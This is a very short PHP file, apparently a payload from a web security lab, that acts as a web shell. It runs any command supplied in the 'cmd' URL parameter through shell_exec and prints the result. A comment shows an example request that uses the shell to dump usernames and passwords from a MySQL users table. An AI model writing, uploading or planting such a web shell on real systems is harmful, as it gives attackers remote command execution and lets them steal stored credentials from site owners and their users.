<?php

echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>"; 
// http://localhost:1111/uploads/lab1_payload.php?cmd=mysql -hdb1 -uuser -ppass -e "SELECT username,password FROM users_db.users"

?>

